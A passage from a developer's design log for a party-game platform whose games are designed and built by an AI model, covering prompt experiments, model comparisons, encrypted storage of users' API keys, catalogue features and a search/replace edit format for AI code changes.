- **Build step:** examples teach the SDK, saving and reloads. Removing them probably means
  more failed attempts; measure later (each build ~10 min).

**Result of the design experiment (2026-10-15, qwen3.8:27b, 5 ideas × with/without the
example designs, one design each, all passed the heading check in 32–72 s):**

| Idea | With examples | Without |
|---|---|---|
| Racing platformer | ASCII, Tower Dash's 7 tiles/s | canvas, its own physics |
| Fantasy RPG | Knight/Mage/Cleric/Rogue (+2 more) | no classes: the room votes as one party |
| Cooking | real-time orders | rounds per order |
| Space shooter | similar either way (canvas, joystick) | similar |
| Thief mystery | similar either way (alibi cards) | similar |

- **Copying is real but narrow:** where an example is close (platformer, RPG), it supplies
  the specifics: numbers, class lists, ASCII. Without it the model invents its own.
- **The names still anchor it:** without the designs, it still names `bumper-blobs` and
  `dungeon-party` as closest examples, because DESIGN.md lists them. That's harmless (the
  build step needs the choice), but it shows how much the prompt's words steer.
- **Designs without examples are ~20% longer** and sometimes slower (up to 72 s).
- **Length is short either way** except the RPGs: 1.5–7 min for the party games, even with
  the Length heading. So option 2 (a default target) looks needed regardless.
- One hallucination: a "with" design claimed Dungeon Party has a secret thief role.

**Decided (2026-10-15):** the design step leaves the example designs out by default (the job
switch `examples: true` brings them back); the build step keeps its example game. And the
rulebook gets the default length target (option 2 above).

**Check of the length target (2026-10-15, the three shortest ideas again, no examples):**
cooking 4 → 6.5 min, space shooter 2 → 4.5–6 min, thief mystery 5.5–7 → **2 min**. It helps
but doesn't hold: the model calls 4.5 min "within 5–15", and for the thief it shortened the
game and argued that "a session plays 3–5 games". Ideas for next time: a fixed
"Total: about N min" line the server reads and shows on the admin page (flagged when outside
the target), or option 3 (a length choice), so the target is an input, not a hint.

**The longer idea: every game made becomes data.** We already keep the idea, every design
draft *with the admin's feedback*, the approved design, every code attempt with its check
report, the playtest results, and the admin's choices (playtest, publish, reject, fixes).
Roughly in order of effort:
1. **Collect more signal:** how often each game is played, finished vs stopped by the host,
   and maybe a thumbs up/down in the lobby after a game.
2. **Retrieval (soon, no training):** pick the examples for each job from the library of
   *published* games, by similarity to the idea (tags first; embeddings if GenAI Studio
   offers an embedding model), instead of a fixed three. More variety, less copying.
3. **Fine-tuning an open model (later):** train a small adapter (LoRA) on accepted
   idea → design and design → code pairs; the drafts with feedback are preference data
   ("this draft, changed like this, was better"). Needs hundreds of good games and GPU
   time (Purdue RCAC's clusters may allow it), and a place to run the result: GenAI Studio
   only serves its own models.
4. **Training a model from scratch:** not realistic for a club project; not planned.

**Before any of this:** users' games are their work; using them for training needs a clear
note in the terms (especially from A7 on, when other hosts generate games).

**Exploration, 2026-10-15: what's actually possible here.**
- **The model's context is 65,536 tokens** (RCAC's model list), for qwen3.8:27b, gpt-oss:120b
  and gemma4. This shaped two fixes the same day: the fix loop keeps only the newest attempt,
  and AI-written games are limited to 100 KB.
- **GenAI Studio has no embeddings API.** It uses EmbeddingGemma internally for its own
  Knowledge Base but doesn't expose it. So retrieval can't use GenAI Studio embeddings.
  Options, in order of preference:
  1. *The model as librarian:* one short extra call with a catalog of the library (each
     game's name, one-line description, template, art style, controls) and the approved
     design; it names the 1–2 most useful examples for the build. No new dependency; the
     catalog stays small (a line per game) until the library reaches hundreds of games.
  2. *Tags:* the design's Template and Art sections already pick a template and an example;
     extend that with genre and controls tags on every published game. Simple and testable,
     but only as good as the tags.
  3. *Local embeddings:* a small embedding model run by our own code (a new dependency and
     a model download: ask first). Only worth it with a large library.
- **"Custom models" in GenAI Studio are presets** (a base model with a saved system prompt),
  not fine-tuned weights. A fine-tuned model would need its own place to run.
- **Fine-tuning on Purdue hardware is plausible but not free:** RCAC ran a LoRA workshop
  (Unsloth, Mistral 7B, QLoRA). The GPU cluster (Gilbreth, newer: Gautschi with H100s) is
  bought by labs; undergraduates may get limited GPU time through Engineering's EURO
  programme for projects that need it. A club project would most likely go through a
  faculty member's lab. Serving the result needs a GPU too (or a quantised GGUF on a
  smaller machine).
- **The data, today:** `npm run admin -- export-data <file.jsonl>` writes one record per
  version (idea or request, design drafts with feedback and who wrote them, the design, the
  code, check results by rule, how far it got, and every build attempt). **Gaps to close
  before it's training data:** nothing records how a game did with real players, and the
  library is tiny.

**Suggested order:** (a) ✅ _done 2026-10-15: store every build attempt with its report
(table `build_attempts`, migration 6; "How it was built" on the admin page; in export-data;
chosen over a git repo per game, which would split each game between the database and the
file system); (b) record games played,
finished vs stopped, and a thumbs up/down after a game; (c) the model-as-librarian retrieval
once there are ~10 published games; (d) revisit fine-tuning at a few hundred games, with a
lab's help.


**Model comparison, 2026-10-15** (`generator/out/compare/`, not in git). Same two ideas
(the racing platformer, the RPG). Each model wrote its own design, and built from the SAME
approved designs qwen built from. qwen's builds are from earlier the same day.

| Model (context) | Design: time, quality | Platformer build | RPG build |
|---|---|---|---|
| qwen3.8:27b (65K) | 36–65 s; concrete, numbers and arithmetic, ~5–6.5 min games | passed, attempt 1 (~5 min); full, playable | passed, attempt 2 (~7 min); 12×12 map with fog, rich |
| gpt-oss:120b (65K) | 11–16 s; detailed, longest | passed, attempt 2 (104 s); **barely visible track, no players drawn** | passed, attempt 4 (209 s); **party stuck at the start** ("can't go" every way) |
| gemma4:26b-a4b (65K) | 6–7 s; short and vague in places | **failed**: the same syntax error 4 times | passed, attempt 1 (94 s); clean, playable |
| llama4:latest (16K) | 11–12 s; vague, no numbers, ignores the rules (2–12 players, 45–60 min) | **failed**: context full after attempt 1 | **failed**: context full after attempt 1 |

- **The checks pass games that are broken to a player** (gpt-oss's two). "Not blank" isn't
  "playable": a check that players actually move or appear would catch these.
- **The fix loop now stays flat:** gpt-oss's 4 RPG attempts each sent ~19.5K tokens (before
  the change, attempt 4 would have sent ~45K).
- **llama4's 16K context can't hold a build** (prompt ~11–15K tokens + the game).
- Conclusion so far: qwen makes the best games but is slowest; gemma4 is fast and sometimes
  good but unreliable; gpt-oss is fast with lower quality; llama4 is out for building.
  **Decided (2026-10-15): qwen3.8:27b stays the only model.**

**No more fixed time limit per model call (2026-10-15).** Replies now **stream** (GenAI Studio
sends the reply, and qwen's thinking, piece by piece: the first piece in ~0.3 s, then every
few ms). A call only fails after **2 minutes of silence**, so a slow but working model is
never cut off (the old 5-minute limit cut off two healthy replies in the live tests). The
admin page shows how far a reply has got ("thinking 1,150 tokens, writing 1,463"). A whole
sandbox job keeps a last-resort limit of 60 minutes (was 20).


**TypeScript, decided 2026-10-15: not now.** A trial run of TypeScript's checker over our JSDoc
(lenient mode, in a scratch folder: nothing added to the project) found **no bugs a player
could hit**, but about 20 places where the JSDoc had drifted from the code as features were
added (the sandbox job still documented as before F5, `onStep`'s arguments, the report
without its playtest, the client's user without `isAdmin`, JSDoc naming parameters that
don't exist so the checker ignored it). Those were fixed by hand. The rest (~80) is loose
typing (`@param {object} msg`) and checker limits on plain JavaScript, not drift. If we want
the checker later: `typescript` as a dev dependency, `// @ts-check` file by file starting with
the protocol, FrameRelay and the database layer, and `npm run typecheck`. Full TypeScript, and
an ORM (whose main benefit is typed queries), wait until then.


### 13o. A bigger helper library (planned 2026-10-15)

**What the AI gets today.** Design step (~3,800 tokens): the rulebook (`GAME_SPEC.md`, ~3,000:
how games work, the rules, the `party` SDK ~950, the `party.ui` reference ~630), the design
format (~600), the art list and the idea. Build step (~14,000 tokens for The Long Road): the
rulebook 21%, the template the design picked 15%, **the example game's code 45%**, the
example's design 5%, the approved design 11%. (The experiment in 13n removed the example
*designs* from the *design* step; the example *game* is still in the build step.)

**The helpers work.** In all 9 games the AI built (four models), the `party.ui` helpers were
used for everything they cover (`el` for all HTML, `ascii` for every map, `gamepad`, `timer`,
`scoreboard`), with no hand-written buttons, canvas drawing or touch handling, and none of
the bugs we found were in a helper's area. Caveat: the example game uses them too, so some
of it may be copying.

**What the games still write by hand** (so, what new helpers would replace):

| Hand-written | Seen in | Candidate helper |
|---|---|---|
| Platformer physics: tile map, gravity, jumps, coyote time | all 3 platformers (copied from Tower Dash); gemma's failed build broke there | `platformer`: a tile world and bodies |
| Votes: collect, count, ties, time out, skip whoever left | every RPG | `vote` |
| Turn order, turn timeouts, skipping disconnected players | every RPG | `turns` |
| Phases and timers that survive a big-screen reload | every game | `phases`: deadline-based, saved with `party.save` |
| A camera that follows the action; fog of war | platformers, RPGs | `ascii` gains a view and fog |
| 3-2-1 countdowns, rankings with ties, dice, player colours | most games | small utilities |

**Plan:**
1. **Baseline first.** Three ideas built from FIXED approved designs (the racing platformer,
   The Long Road, and a turn-based board game), in variants **A** (as today) and **B**
   (today minus the example game's code). Compare: passed or not, attempts, time, tokens,
   code size, hand-written machinery left, and a playability look at the screenshots. One
   run each: a strong hint, not proof.
2. **Build the helpers** (`vote`, `turns`, `phases`, the `ascii` view and fog, `platformer`,
   the small utilities), each tested in the UI Demo game, each with a short entry in the
   rulebook (~100 tokens; ~1,000 in all, a sixth of the example game).
3. **Variant C** (new helpers, no example game) on the same designs; compare with A and B and
   decide whether the example game stays in the build step.

**Results (2026-10-16, qwen3.8:27b, one run per cell; files in `generator/out/helpers-exp/`):**

| Variant | What the AI got | Build prompt | Passed | 1st try | Total time | Code size |
|---|---|---|---|---|---|---|
| A | as before (with example game) | 12–15.5K tokens | 3/3 | 2/3 | 811 s | 16.5 / 28.6 / 25.7 KB |
| B | no example game | ~7K | 3/3 | 1/3 | 1,380 s | 21.7 / 25.1 / 23.5 KB |
| C | no example game, `party.kit` | ~8K | 3/3 | 0/3 | 1,455 s | 13.4 / 21.2 / 22.0 KB |
| C2 | C again, fixed checker + camelCase rule | ~8K | 3/3 | **3/3** | **745 s** | 13.7 / 27.5 / 27.0 KB |

(Sizes: platformer / RPG / board.)

- **The failed first tries were mostly not the game's fault.** 4 were `style:{flex-direction:…}`
  (a syntax error: fixed by the camelCase line in the rulebook) and 3 were the static check's
  false alarm on a game's own `top` variable (fixed in the checker). Two real bugs were left:
  A-board had a plain syntax slip ("missing )"), and
  C-rpg drew `party.ui.ascii('#map')` before making `#map`. A, B and C ran on the old checker
  and rulebook, so C2 is the only fair picture of "today".
- **Fixes are fast without the example game.** A fix attempt in B/C takes 76–158 s (the fix
  prompt is ~15K either way); a first attempt takes 160–400 s, mostly writing.
- **`party.kit` use is real but uneven.** C used it a lot (phases, votes, turns, the platformer
  world, rank). In C2 the platformer used it (platformer, phases, rank, countdown), the RPG used
  only the small utilities and wrote its own vote and phases, and the board game used none of
  it. Nothing broke where the kit was used. The rulebook entry is short; a tiny "how to use
  phases/vote/turns together" sample may be what's missing.
- **Screenshots:** all 12 games show a working screen and controls; C/C2 look as good as A. The
  RPG's 4×4 view comes from the fixed design, not the variant.

**Decision (made 2026-10-16):** drop the example game's code from the build step (`exampleGame: false`
by default). C2 matched or beat A on every measure with about half the prompt, which also
leaves more of the 65K context for fixes and bigger games. Keep the example game as an option
for retries. Next: a few more C2-style runs over time, and a short combined kit sample in the
rulebook if games keep skipping the kit.

## 14. The game catalogue (decided and built 2026-10-16)

The host picks a game from a dropdown today. With more (AI-made) games that stops working:
you can't see what a game looks like, what kind it is, or whether it fits your group.

**Decided with the user:** a public **`/games`** page anyone can browse, and the same cards
replacing the dropdown in the host lobby. Each card: a **screenshot**, name, description,
**players and length**, **tags**, and the AI-made badge. Filters: **search** by name,
**tag** chips, **how many players** (in the lobby: the people in the room), and **sort**
(A–Z, newest; "most played" and "best rated" once player signals exist).

**How:**
- **Two new optional game-info fields:** `"tags": ["platformer", "racing"]` (1–4 from a
  fixed list in `server/src/games/tags.js`, so filters stay useful and the AI can't invent
  near-duplicates) and `"minutes": [5, 15]` (a typical game's length, low to high). Optional,
  so games made before keep working; the cards just show less. The rulebook asks the AI for
  both, and the design's Length section already works the number out.
- **Screenshots:** an official game ships `thumb.jpg` next to `game.html` (taken with
  `npm run check-game -- … --shots`, the playtest's big-screen picture). An AI-made game uses
  the big-screen screenshot its final check already saved in the version's report. Served by
  `GET /api/games/:id/thumb` (same visibility as the game; cached by the browser). No
  screenshot (imported games): a coloured tile with the game's initial.
- `GET /api/games` adds `tags`, `minutes` and `addedAt` (generated games: when they were made;
  official games: none, so they sort last under "newest").
- **Client:** one `GameCatalogue` component (cards + filters) used by `/games` (a "Host this
  game" button → `/host?game=<id>`, which preselects it) and by the lobby (pick a card, then
  Start). Filters are worked out in the browser: the list is small.

## 15. Bring your own key: every account can make games (A7, decided and built 2026-10-16)

**Decided with the user:** any account holder can generate games with **their own** Purdue
GenAI Studio API key (so it runs as them, on their quota: RCAC's "a key acts with your
identity" is respected). The key is **stored, encrypted**, so it's entered once. **One AI job
per person at a time.** A guide with screenshots shows how to get a key. (Rejected: the
server minting keys from the admin's account. Every such key would act as the admin, and
minting needs the admin's Purdue login on the server.)

**How:**
- **Storing the key** (migration 7, table `genai_keys`): AES-256-GCM (`node:crypto`, no new
  dependency) with a server secret that is NOT in the database: `GENAI_KEY_SECRET` (32 bytes,
  base64) or, if unset, a random one made once in `server/data/key-secret` (file mode 600).
  The user id is bound in (GCM's "additional data"), so a stolen row can't be moved to
  another account. A copy of the database alone reveals no keys. The key is never sent back
  to the browser (only its last 4 characters) and never logged.
- **Saving checks the key** with one call to GenAI Studio's model list, so a typo is caught
  right away. `GET/PUT/DELETE /api/account/genai-key`.
- **Using it:** for each job, the server decrypts the key and creates a **temporary OpenShell
  provider** (`openshell provider create --type genai-studio --from-existing`, with the key in
  that command's environment, never its arguments), runs the sandbox with it, and deletes the
  provider afterwards. The sandbox still only sees a placeholder. Admins without a saved key
  keep using the server's `genai-studio` provider.
- **Who:** `/api/generations` (logged in, with a saved key, or an admin) works like the admin
  routes but only on your own games. Publishing to everyone stays admin-only (`/api/admin`),
  since admin approval is what makes the frame-game risks acceptable (§13e). A user's games
  are playtest games: only they can see and start them.
- **One job per person:** starting a design, build or change while another of yours is
  waiting or running is refused (`409 ALREADY_RUNNING`). The server-wide queue limit stays.
- **Pages:** `/account` (the key, with the 3-step guide; screenshots in
  `client/public/help/genai-key/`) and `/create` (the admin page's game maker, for your own
  games). The home page links to both.

## 16. Getting around: site links, game pages, votes, creators and profiles (decided and built 2026-10-16)

**Decided with the user:**
- **Links at the top right of every page**, next to ⚙: Games (the catalogue), Docs (`/kit`),
  and Sign up, or Account when logged in. Hidden while a game is on screen.
- **Votes:** ▲/▼ (up/down) per game, one vote per account (change or take it back any time); not on
  your own games. The catalogue can sort by top rated (▲ minus ▼).
- **A page per game**, `/games/<id>`: its screenshots, description, players, length, tags,
  votes, its creator, and Host this game. Catalogue cards open it (lobby cards still just
  choose).
- **The creator can edit** its name, short description, a longer "About this game", tags,
  length, and which screenshot leads. Admins can edit any game, including official ones.
- **Every game shows who made it** ("by alpingold"; official games: "by BoilerGames"), and the
  name links to their **profile** `/u/<username>`: their bio (edited on /account) and the
  games of theirs you can see.

**How:**
- **Edits never touch the game file.** They're stored as a catalogue entry next to it
  (migration 8, `game_pages`): no code changes, so nothing needs checking again. Plain text
  only (React shows it as text, never as HTML), same limits as the game info (§14), "About"
  up to 1,500 characters. Creator edits go live at once; an admin can change them back.
- **Votes** (migration 8, `game_votes`: game, account, +1/−1). A generated game's versions
  share one page and one vote count (the votes belong to the game, not a version).
- `users.bio` (migration 8, up to 500 characters).
- `GET /api/games` adds `creator`, `votes {up, down}`, `myVote`, with the catalogue entry
  applied. New: `GET /api/games/:id`, `PUT /api/games/:id/page`, `PUT /api/games/:id/vote
  { value: 1 | -1 | 0 }`, `GET /api/games/:id/shot/host|phone`, `GET /api/users/:username`,
  `PUT /api/account/profile { bio }`.
- Official games also ship `phone.jpg` (the checker's phone screenshot).

## 17. A room is for one game (decided and built 2026-10-16)

**Decided with the user:** you pick a game in the catalogue *before* opening a room, instead
of the lobby loading the whole catalogue. The lobby shows only that game (picture, players,
length) with Start game and **Change game**, which warns that it ends the room (everyone has to
join the new one), ends it, and opens the catalogue.

**How:** `/host?game=<id>` (from "Host this game"); `/host` without a game goes to `/games`.
The page loads just that game (`GET /api/games/:id`) before opening the room, so a game that
isn't there (or isn't yours to playtest) never gets a room. The server didn't change: a room
was never tied to a game; the page keeps the choice in its address, so a reload keeps it.
After logging in without a `next`, you land on `/games`. The lobby's card picker is gone.

## 18. Shapes, not ASCII; games that fit (decided and built 2026-10-16)

**Decided with the user:** ASCII art (as used) looked poor and steered games toward genres
that don't fit (Tower Dash, a precise platformer). Removed: the official games **Tower Dash**
and **Dungeon Party** (and their designs, which were the AI's examples), the imported AI
games Checkpoint Dash and The Long Road (database backed up first), `party.ui.ascii` (with its
camera and fog options) and `party.kit.platformer` (its levels were text grids). Kept:
**Bumper Blobs**, the only example game now, and `party.kit.camera` (plain arithmetic).

**Instead:** games draw with **simple geometric shapes** on a canvas (or HTML and CSS). The
rulebook has a "How to draw" section (flat colours, player colours with initials, big shapes,
a canvas sized to its box and the screen's pixel ratio) and says which games fit: the phone for
choices, secrets, words, drawings and simple steering; the big screen for the shared show; no
precise timing on a touch screen (~0.05–0.15 s from phone to screen, buttons you can't feel,
eyes on the TV). The `turns` template draws its board with shapes. It also says `async`/`await`
is fine (only the old block games, which ran on the server, couldn't use it).

**Next (art):** a small `party.draw` helper for shapes (see the user discussion on 2026-10-16),
then a curated, openly licensed sprite/icon set in the art library.

## 19. /create as a guided flow (decided and built 2026-10-16)

**Decided with the user:** `/create` was the admin page's game maker with a friendlier intro:
one long page with the idea box, every game, and one game's versions, test reports, attempts,
ids and code (open by default). Fine for the admin; too much for a player making their first
game. Now it walks you through the steps instead. Frontend only: the server and its rules
didn't change, and `/admin` stays as it was.

**How:**
- **`/create`**: the idea box, with four example ideas to start from (games that fit, §18)
  and one line on what works well; then **Your games**, one row each, with a small four-dot
  track and what it's doing in words. Writing the design takes you to the game's own page.
- **`/create/<id>`** (a page per game): the game's name as the heading, your idea, a
  **board-game track** (Idea → Design → Build → Play; for a change: Change → Plan → Build →
  Play) with the game as a token on the step it's at, and one panel with only what that
  step needs: reading the design (build it, edit it, ask for a new draft), the AI working
  (what it's doing now; you can close the page), a failed build (build again), or **Play it
  now** (makes it your playtest version and opens a room for it in one click) with
  screenshots from the AI's test and **Want it different?** (ask for changes).
- **For the curious** (closed): every version, the checks' report, how it was built, and
  the code. Kept for people who want to learn from it; it's the same code the admin reads.
- Where a game is comes from its newest version's status (`whereIs` in `CreateGame.jsx`),
  the same statuses the admin page shows. The page asks for the small list every 2 s while
  the AI works and fetches the whole game (with its code) only when it changed.
- **Look:** the site's colors and fonts, plus one new one, Boilermaker gold, used only for
  the track (how far your game got). The token hops when the game moves on while you watch
  and breathes while the AI works; both are off with "reduce motion".

## 20. Does `party.kit` help? (experiment, 2026-10-16)

**Question (the user):** games may look too similar and worse when they lean on helpers. The
two ideas behind Checkpoint Dash and The Long Road were designed fresh with today's rulebook,
then each design was built twice: **K** (today: `party.kit` documented, the design's starter
template) and **F** (`helpers: false`: no kit section, no template). One run each. Files in
`generator/out/kit-exp/`.

| | K-platformer | F-platformer | K-RPG | F-RPG |
|---|---|---|---|---|
| Attempts | 1 | 1 | 3 | 1 |
| Model time | 4.6 min | 3.2 min (+14 min lost to an empty reply from GenAI Studio) | 10.3 min | 3.7 min |
| Prompt | 8.2K tokens | 5.4K | 9.3K | 5.7K |
| Code | 14 KB | 21 KB | 31 KB | 34 KB |
| Kit used | phases, colorOf | – | phases, colorOf, rank | – |

- **The kit is barely used even when offered** (2–3 small helpers), and **F passed first time
  both times**. K-RPG's two failed tries were its own bugs (a `Set` in saved state; a syntax
  slip), not the kit's.
- **The look comes from the design and the rulebook, not the kit.** K and F of the same design
  look almost the same (the platformer: three lanes, coloured circles with initials, grey
  blocks, stars). The rulebook's own "How to draw" advice (§18) is concrete enough to make
  games alike, and both platformers draw a thin band on an otherwise empty light page.
- **A small cost of no kit:** F-platformer wrote its own place labels and got them wrong
  ("2st", "3st"); the kit's `ordinal` would have been right.
- **The new rulebook changed the designs:** the platformer became a forgiving lane race
  ("Star Sprint"), the RPG a group-vote adventure ("Realm Party").

**Decided (2026-10-16), and done:** `party.kit` and the three starter templates are gone
(from the frames, the checker, the prompt and the rulebook); builds get the rulebook and the
design only. `party.ui` stays (real input widgets). The rulebook's "How to draw" no longer
prescribes a look (coloured circles with initials…): each design's **Art** section now picks
the game's own palette, background, shape style and motion, and the rulebook asks for that
look, filling the screen, and motion over detail. The design's "Template" heading is gone. New
in the rulebook: a saved snapshot is plain JSON (a `Set` comes back as `{}`, K-RPG's bug).
Browser tests keep a kit-free "Unique Number" (the old rounds template) as a test game.

## 21. `party.ui`: what's hard to build, and better phones (decided and built 2026-10-16)

**Looked at:** which widgets 25 AI-made games used (`el` 25, `timer` 13, `gamepad` 11,
`scoreboard` 8, `countdown` 4, `joystick` 2, `drawPad` 0; none wrote their own touch
handling) and how hard each is to get right on a phone. Hard: `drawPad` (smooth lines, phone
vs TV shapes, small enough to send), `joystick` and `gamepad` (fingers, interruptions, keys).
Easy and mostly a look: `scoreboard`.

**Done (with the user's go-ahead):**
- **Phones in a game:** the site header is hidden; one slim bar under the game holds the
  name, room, ⚙ and Leave, so the game gets nearly the whole screen (it lost ~9rem before).
  `viewport-fit=cover` and safe-area padding keep it clear of notches and the home bar.
- **The screen stays on** during a game (Wake Lock, taken again when the page comes back).
  Needs HTTPS (or localhost), so it works once deployed, not over a LAN/Tailscale address.
- **Gamepad:** a thumb slides from one button to the next without lifting (◀ to ▶).
- **Joystick:** starts where the thumb lands, with a small dead zone.
- **`party.ui.textInput`** for word games: Enter/Send, empty ignored, a counter, text big
  enough that phones don't zoom in. (Not a `<form>`: the sandbox blocks form submission.)
- **`party.ui.sound(name)`:** short sounds made in code (no files), and the iframe gets
  `allow="autoplay"` so the big screen, where nobody taps the game, may play them.
- **`scoreboard` removed** (each game shows scores in its own style). The restored Checkpoint
  Dash keeps a pasted-in copy of it; the e2e Unique Number has its own list.
- Not done: vibration (Android only, and the parent page would have to do it for the game).

## 22. Focus: the games that fit (decided 2026-10-16)

**Why:** everything we tried showed that platformers and RPGs, as we built them, don't fit a
room where everyone looks at one TV and plays on a phone. Tower Dash needed precise jumps on
buttons you can't feel, with 0.05–0.15 s between thumb and screen and eyes on the TV
(§18). The RPGs were long, mostly reading, and one player's turn left everyone else waiting.
The fresh designs of §20 already drifted away from them (a lane race, a group vote).

**The focus from now on:**

| Genre | Why it fits | Phone | Big screen |
|---|---|---|---|
| **Drawing and guessing** | everyone acts at once; funny reveals | `drawPad`, `textInput` | the drawings, the guesses |
| **Writing and voting** (Quiplash-style) | private answers, a shared laugh | `textInput`, buttons | answers side by side, the vote |
| **Bluffing, secrets, hidden roles** | the phone keeps a secret; the room talks | your secret, your choice | the story, the reveal |
| **Trivia and quick decisions** | everyone answers at once | big buttons | the question, who got it |
| **Board and turn games** (short turns) | a shared board everyone can see | your options | the board |
| **Loose real-time action** (Bumper Blobs) | forgiving: 0.1 s late doesn't matter | `joystick`, `gamepad` | the arena |

What they share: **everyone does something at the same time** (or turns take seconds), the
phone holds what's **private** (an answer, a secret, a drawing), the TV is **the show**, and a
game lasts minutes, not hours.

**What this changes:**
- **What we build and test next:** example games, AI experiments and play-tests use ideas from
  these genres (e.g. a drawing game, a Quiplash-style game, a bluffing game, trivia), not the
  platformer/RPG ideas we used as test ideas until now (§13n, §13o, §20).
- **Platform work follows these genres:** what they need (text input, drawing, sound,
  phones that stay awake, phases with timers, private state per phone) comes first. §21's
  `textInput` and `sound` were the first of these. Long-game work (drop-in, saving between
  nights, Q17/Q18) is shelved.
- **The AI:** the rulebook already says what plays well (§18) and the design step adapts ideas
  toward it (a "racing platformer" came back as a lane race). Nothing stops someone asking for
  another genre; we just don't optimise for it.
- **Kept, not removed:** the platform still assumes nothing about a game's shape (13h); the
  `platformer`, `rpg` and `adventure` catalogue tags stay so any such game can be labelled.

## 23. Edit mode: the AI sends changes, not whole files (decided and built 2026-10-16)

**Why:** when the AI changed a game (a change request) or fixed its own failed attempt (the
fix loop), it wrote the WHOLE file again. That was slow (6–12K output tokens, 1–3 minutes,
for a one-line change), it limited which games the AI could change (the old file and the new
one both had to fit in the 65,536-token context), and the model "tidied" code nobody asked
it to touch: in the experiment below, whole-file replies deleted most of the comments,
swapped colours and added a typo, on top of the change asked for.

**What was built:**
- **The format** (`generator/src/edits.js`): git's merge-conflict markers, which a model has
  seen countless times and which never appear in working game code (`FIND` is accepted for
  `SEARCH`):
  ```
  <<<<<<< SEARCH
  exact lines from the file
  =======
  the new lines
  >>>>>>> REPLACE
  ```
  The rules the model gets are short, concrete and come with one example (`EDIT_FORMAT` in
  `prompt.js`): copy SEARCH exactly, use 2–6 whole lines so it matches one place, to add code
  search for the line before it, and never let two edits touch the same lines.
- **Applying them is strict, all or nothing.** Each SEARCH must match the file exactly once.
  The only thing forgiven is whitespace at the end of lines (models drop it, and it never
  matters); indentation must match. If any edit fails, nothing is applied and each failure
  goes back to the model like a check finding: "edit 3: this text isn't in the file: …",
  "matches 2 places in the file: include more lines", "overlaps what edit 1 already changed",
  "isn't finished", "the SEARCH part is empty". The result is always a whole file again, so
  checkGame, the saved attempts, the admin page's changed lines and `build_attempts` work as
  before.
- **Where:** change requests (planned and "small fix") and fix attempts 2–4 of every build,
  a first build's too. A new game's first attempt still writes the whole file (there's
  nothing to edit). A model that replies with a whole file anyway is accepted.
- **A fix shows the game once:** the model sees its last file as its own reply, followed by
  the problems. For a change, the old code is left out of the prompt in a fix, so the game
  isn't in the conversation twice (old + new).
- **Fallback:** if edits fail to apply twice in a row in one job, the model is asked for the
  whole file (the old way) for the rest of the job, if the game is at most 60 KB.
- **Recorded:** each attempt has a `mode`, `whole` or `edits` (**migration 9**, a column on
  `build_attempts`; older rows were all whole files and are marked so). The admin page shows
  "· edits" on an attempt, and the dataset export includes it. An attempt whose edits didn't
  fit has no code; its report lists why. (`SCHEMA.md` now also reads a column added by
  `ALTER TABLE` correctly.)
- `"edits": false` in a job turns it off (used for the comparison below).

**The limits, and their arithmetic** (`prompt.js`). Measured on our games: code is about
**2.8 bytes per token** (2.7–3.3 from the prompt sizes in `generator/out`; prose is ~3.7). The
old comment assumed ~3.5, so "100 KB old + 100 KB new" never really fit: at 2.8 that's 73K
tokens before any thinking.

| | Edit mode (default) | Whole file (fallback) |
|---|---|---|
| Context | 65,536 | 65,536 |
| Rulebook, art, design, plan, request | −6,000 | −6,000 |
| Problems (in a fix) | −1,000 | −1,000 |
| Thinking + reply | −20,000 (edits measured <1K; room for a hard change) | −10,000 thinking |
| Left for the game | 38,500 tokens, once | 48,500 tokens for two copies: ~24K each |
| × 2.8 bytes | ≈ 108 KB | ≈ 68 KB |
| **Limit** | **100 KB** | **60 KB** |

The edit-mode limit is the same as the rulebook's limit for every game the AI writes
(`MAX_GAME_BYTES`, 100 KB), so any AI-made game can be changed, and a change can't grow a
game past it. **First builds keep 100 KB:** with no old game in the conversation a 100 KB
game plus the longest thinking we've seen (~24K) is right at the edge, but the games the
model writes are 12–35 KB, so lowering it would only refuse games it doesn't write.

**The experiment** (`generator/out/edit-exp/`, git-ignored; qwen3.8:27b, one run each, both
modes in parallel from the same plan). Subjects: Bumper Blobs (18 KB), "Realm Party" (F-rpg,
34 KB) and "Star Sprint" (F-platformer, 21 KB) from §20. E and F had a bug put in by hand
(each failed the checks before the change), so the fix loop had to run; G is a first build
(a Quiplash-style game, §22) whose first attempt happened to fail in edit mode's run.

| Case | Request | Mode | Passed | Attempts | Model time | Out tokens | Lines changed (+/−) |
|---|---|---|---|---|---|---|---|
| A | bumper: sounds for a fall and a round win (planned) | edits | ✓ | 1 | 11 s | 921 | +9 / −1 |
| | | whole | ✓ | 1 | 68 s | 6,229 | +23 / −27 |
| B | bumper: bigger blobs (small fix) | edits | ✓ | 1 | 6 s | 425 | +1 / −1 |
| | | whole | ✓ | 1 | 69 s | 6,287 | +1 / −1 |
| C | RPG: HP, level and gold on every phone (small fix) | edits | ✓ | 1 | 13 s | 968 | +10 / −0 |
| | | whole | ✓ | 1 | 135 s | 12,058 | +39 / −62 |
| D | platformer: 4 laps, lap on the phone (planned) | edits | ✓ | 1 | 8 s | 657 | +4 / −4 |
| | | whole | ✓ | 1 | 91 s | 7,696 | +4 / −4 |
| E | bumper with a bug: melt after 15 s | edits | ✓ | 2 (fix: edits) | 4 + 10 s | 299 + 822 | +2 / −2 |
| | | whole | ✓ | 1 | 71 s | 6,417 | +2 / −2 |
| F | RPG with a bug: boss +25% HP | edits | ✓ | 2 (fix: edits) | 14 + 6 s | 418 + 248 | +3 / −3 |
| | | whole | ✓ | 1 | 159 s | 11,381 | +6 / −10 |
| G | first build, Quiplash-style | edits | ✓ | 2 (whole, then a fix as edits) | 244 + 13 s | 14,179 + 757 | – |
| | | whole | ✓ | 1 | 175 s | 11,186 | – |

**What it shows:**
- **Everything passed both ways, and no edit ever failed to apply** (10 edit replies, 0
  failures), so the fallback was never needed live (it's covered by unit tests only).
- **Edit mode is 5–15× faster and writes ~10× fewer tokens:** 6–14 s per reply instead of
  1–2.5 minutes. A fix costs seconds instead of minutes (G's fix: 13 s, 757 tokens, where a
  whole-file fix used to take ~3 minutes and 10–20K tokens).
- **Whole files change what wasn't asked:** A-W and C-W deleted most comments (they explain
  the code to people), C-W and F-W swapped CSS-variable colours for fixed ones, F-W added a
  typo ("sighes"). The edit-mode results changed only the lines the task needed.
- **The honest cost:** with edits the model only does what it's told. In E and F, the whole-
  file runs fixed the hand-made bug on the way (they reread everything), while edit mode
  made the change, failed the check, and fixed the bug in a second, ~10 s attempt. Total
  time was still 2–3× shorter. C-E's status bar is drawn from the state phones get; C-W also
  added the stats to the setup screen's state, which C-E didn't (a smaller change, still
  passing the checks).
- One run each, mostly small games and small changes: big rewrites (a new phase, a new
  mode) weren't tried, and that's where edits are most likely to miss a spot.

**Recommended, and built that way:** edit mode is the default for changes and fixes; whole
